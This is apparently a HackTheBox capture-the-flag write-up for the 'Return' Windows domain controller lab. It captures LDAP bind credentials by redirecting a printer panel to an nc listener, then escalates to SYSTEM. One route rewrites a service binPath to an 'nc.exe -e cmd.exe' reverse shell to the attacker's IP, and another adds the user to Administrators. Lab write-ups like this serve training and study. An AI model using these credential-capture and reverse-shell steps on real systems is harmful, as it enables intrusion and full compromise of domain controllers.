# Return - HackTheBox Writeup

**OS:** Windows (Server 2019, Domain Controller)
**Difficulty:** Easy
**Topics:** Printer Admin Panel, Rogue LDAP Credential Capture, WinRM, Server Operators Group, Service Reconfiguration (`sc config`) to SYSTEM

---

## Enumeration

```bash
nmap -sC -sV -p- 10.129.95.241
```

Relevant ports (classic AD / Domain Controller footprint, plus a web app on 80):

- **53** - DNS
- **80** - HTTP, **HTB Printer Admin Panel**
- **88** - Kerberos
- **135 / 139 / 445** - RPC / NetBIOS / SMB
- **389 / 636 / 3268 / 3269** - LDAP / LDAPS / Global Catalog, `Domain: return.local`
- **464** - kpasswd5
- **593** - RPC over HTTP
- **5985** - WinRM
- **9389** - AD Web Services
- High ephemeral RPC ports (47001, 49664+)

Host: `PRINTER` (the DC). Domain `return.local`.

---

## Foothold - Rogue LDAP Credential Capture

### 1. The printer admin panel

Port 80 serves a printer administration web app. The **Settings** page (`/settings.php`) exposes the configuration the printer uses to talk to the directory - crucially a **Server Address** field pointing at the internal LDAP server (`printer.return.local`), with a password field pre-filled (masked) for the service account the printer binds as.

The app does not let you *read* the stored password, but it does let you change **where** the printer sends it. If you point the Server Address at a host you control and trigger the connection, the printer will bind to *your* server using its stored credentials - in cleartext.

### 2. Listener on the LDAP port

Start a plain listener on **389/tcp** before saving the form:

```bash
nc -lvnp 389
```

### 3. Redirect the printer to your box

In the Settings page, change **Server Address** from `printer.return.local` to your VPN IP (`tun0`), e.g. `10.10.15.55`, and submit.

The printer immediately connects back and leaks the bind credentials:

```text
listening on [any] 389 ...
connect to [10.10.15.55] from (UNKNOWN) [10.129.95.241] 51639
0*`%return\svc-printer
                       1edFg43012!!
```

Credentials recovered:

```text
return\svc-printer : 1edFg43012!!
```

> See the cheatsheet: [Rogue LDAP / Service Credential Capture](../../README.md#rogue-ldap--service-credential-capture).

### 4. WinRM access

`svc-printer` is in **Remote Management Users**, so WinRM is open to it:

```bash
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
```

-> Shell as `return\svc-printer`.

```powershell
type C:\Users\svc-printer\Desktop\user.txt
```

---

## Privilege Escalation - Server Operators Group

### 1. Check group membership

```powershell
whoami /groups
```

Key memberships:

```text
BUILTIN\Server Operators            Alias   S-1-5-32-549
BUILTIN\Print Operators             Alias   S-1-5-32-550
BUILTIN\Remote Management Users     Alias   S-1-5-32-580
```

**Server Operators** is the win here. On a Domain Controller this built-in group can manage, start, and stop services. Services run as **LocalSystem**, so if you can repoint a service's binary path and restart it, your command runs as **NT AUTHORITY\SYSTEM**.

### 2. Pick a service you can restart

```powershell
# Confirm you can query/configure a service (VMTools is the usual choice on Return)
sc.exe qc VMTools
```

### 3. Reconfigure the binary path

Two common payloads:

**a) Reverse shell via `nc.exe`** (most reliable - upload `nc.exe` first):

```powershell
# Upload a static nc.exe to a writable path
upload /usr/share/windows-resources/binaries/nc.exe C:\Windows\Temp\nc.exe

# Repoint the service binary at nc.exe
sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.55 4444"
```

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Then restart the service to execute the new binPath as SYSTEM:

```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

-> SYSTEM shell on the listener.

**b) Quick one-shot - add yourself to local Administrators** (no listener needed):

```powershell
sc.exe config VMTools binPath="cmd.exe /c net localgroup Administrators svc-printer /add"
sc.exe stop VMTools
sc.exe start VMTools
```

> `sc.exe start` will report a timeout/`1053` error because `nc.exe`/`net` is not a real service - that is expected, the command still runs. For the group-add variant, reconnect with evil-winrm afterwards so the new Administrators membership is in your token.

### 4. Loot

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

> Cheatsheet reference: [Service Reconfiguration via `sc config` (Server Operators)](../../README.md#service-reconfiguration-via-sc-config-server-operators).

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Full TCP scan, AD/DC fingerprint + web app on 80 | nmap |
| Foothold | Printer panel -> rogue LDAP server captures bind creds | web UI, `nc -lvnp 389` |
| Access | WinRM with leaked service creds | evil-winrm |
| Local enum | Group membership (`Server Operators`) | `whoami /groups` |
| PrivEsc | Repoint a service binPath, restart as LocalSystem | `sc.exe config` / `stop` / `start` |
| SYSTEM | Reverse shell (nc.exe) or add to Administrators | nc.exe / net localgroup |

---

## OSCP Notes

- Any device/app that stores credentials and lets you set *where* it authenticates (LDAP, SMB, SMTP, a "test connection" button) is a credential-capture primitive: point it at a listener you control and read the bind off the wire. You never need to crack or even see the stored password.
- A plain `nc -lvnp 389` is enough to catch a cleartext LDAP simple-bind - you do not need a full rogue LDAP server (`slapd`, Responder) for the capture itself.
- `whoami /groups` is the whole privesc on this box - **Server Operators** on a DC is effectively SYSTEM because it can reconfigure and restart services, which run as LocalSystem. Treat membership in `Server Operators`, `Backup Operators`, `Print Operators`, and `DnsAdmins` as a privesc path, not just metadata.
- Service-binPath abuse via `sc config` differs from the PowerUp "writable service binary" case: you are not overwriting a file on disk, you are rewriting the service's configured command because your group lets you reconfigure the service directly.
- The `1053` / timeout error on `sc start` is a non-issue - the Service Control Manager tried to run your command as a service, it isn't one, but the process still spawns. Catch the shell / check the group before assuming failure.
- Print Operators (the second group here) is a separate path via `SeLoadDriverPrivilege` - worth knowing, but Server Operators is the shorter route on Return.
